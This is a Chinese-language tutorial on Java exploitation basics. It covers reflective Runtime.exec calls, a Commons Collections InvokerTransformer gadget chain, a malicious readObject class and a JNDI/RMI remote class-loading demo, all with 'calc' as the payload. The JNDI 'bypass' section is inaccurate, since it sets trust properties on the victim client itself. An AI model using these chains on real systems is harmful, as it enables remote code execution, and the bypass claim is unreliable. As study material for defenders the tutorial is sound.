# Java基础漏洞的自我修炼

## 一、利用反射进行攻击

### 1. 利用反射调用方法

```java
Object[] argss = new Object[]{"getRuntime", null};
Method mm = (Method) Runtime.class.getClass().getMethod("getMethod", new Class[]{String.class, Class[].class}).invoke(Runtime.class, argss);
```

相当于执行了：

```java
Method mm = Runtime.class.getMethod("getRuntime", null);
```

### 2. 调用`invoke`方法

```java
Runtime rr = (Runtime) mm.getClass().getMethod("invoke", new Class[]{Object.class, Object[].class}).invoke(mm, new Object[]{null, null});
```

相当于执行了：

```java
mm.invoke();
```

### 3. 执行命令

```java
rr.getClass().getMethod("exec", new Class[]{String.class}).invoke(rr, "calc");
```

相当于执行了：

```java
rr.exec("calc"); // rr已经是Runtime对象了，而不是Runtime类。
```

### 4. 使用`ConstantTransformer`和`ChainedTransformer`

`ConstantTransformer`在初始化时会将一个final变量放入其中，`transform(任意Object)`都会返回那个变量。我们可以利用这一点进行反射攻击。

#### 反射代码示例

```java
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(Object.class);
```

### 5. 不通过调用`transform`方法执行反射链

我们需要找到实现`transform`方法的类。经过查找发现，`AbstractInputCheckedMapDecorator`类下的`TransformedMap`类可以控制`valueTransformer`的值为`ChainedTransformer`对象。

#### 示例代码

```java
Map mp = new HashMap();
mp.put("ok", "notok"); // 为什么赋值是因为要用到setValue

// 这里decorate是静态方法，直接使用
Map dd = TransformedMap.decorate(mp, null, chainedTransformer);

// 用过Entry来获取键值对，将Map通过entry放入Set集合，然后用迭代器迭代
Map.Entry entry = (Map.Entry) dd.entrySet().iterator().next();

// 更改其中的值，达到目标
entry.setValue("ok");

// 这里绕过黑名单，利用已知类的反射链，获取反射的方法，最后反射可以利用序列化达到目的。
```

## 二、反序列化漏洞

### 1. 序列化与反序列化

Java 的序列化是把 Java 对象转换为 JVM 可以识别的字节序列的过程，便于存储在文件、JVM 内存或网络传输等。常见的`ObjectOutputStream`类的`writeObject()`方法可以实现序列化的功能。而反序列化是指把字节序列重新恢复成 Java 对象，反序列化用`ObjectInputStream`类的`readObject()`方法。

### 2. 实战演练

在实现自己的`readObject`方法时，反序列化后`readObject`正好被利用，触发恶意代码。反序列化利用的方式很多。

#### 示例代码

```java
public class Exploit implements Serializable {
    private static final long serialVersionUID = 1L;

    public Exploit() {
        // 构造函数
    }

    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        // 恶意代码
        Runtime.getRuntime().exec("calc");
    }
}
```

## 三、JNDI注入漏洞

### 1. JNDI漏洞原理

在`lookup`参数可控的情况下，我们传入`Reference`类型及其子类的对象。当远程调用类的时候，默认首先会在RMI服务器中的classpath中查找。如果不存在对应的class，就会去提供的URL地址加载类。如果都加载不到的话就会失败。

### 2. 实战演练

#### 搭建Registry Server

```java
Registry registry = LocateRegistry.createRegistry(1099);
registry.rebind("Exploit", new Exploit());
```

#### 创建`ExecTest`类

```java
public class ExecTest {
    static {
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

编译成1.5版本支持的`ExecTest.class`字节码文件，并删除本地的`bin/ExecTest.class`文件，确保真正远程加载。

#### Client端

```java
Properties props = System.getProperties();
props.put("com.sun.jndi.rmi.object.trustURLCodebase", "true");
props.put("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");

InitialContext ctx = new InitialContext(props);
ctx.lookup("rmi://localhost:1099/Exploit");
```

运行Client，可以看到远程加载`ExecTest.class`并成功执行命令。

### 3. 绕过限制

对于高版本的限制，可以通过设置系统属性来绕过：

```java
System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
System.setProperty("com.sun.jndi.cosnaming.object.trustURLCodebase", "true");
```

还可以通过LDAP + JNDI请求LDAP地址来突破限制，利用LDAP反序列化执行本地Gadget来绕过。

## 四、总结

了解Java的基础漏洞，如反射、反序列化和JNDI注入，有助于我们在实际应用中更好地防御这些攻击。只有知己知彼，才能百战百胜。修炼永无止境，万物皆是如此，需屏气凝神方能比其更为强大，以至于交手时不落于下风。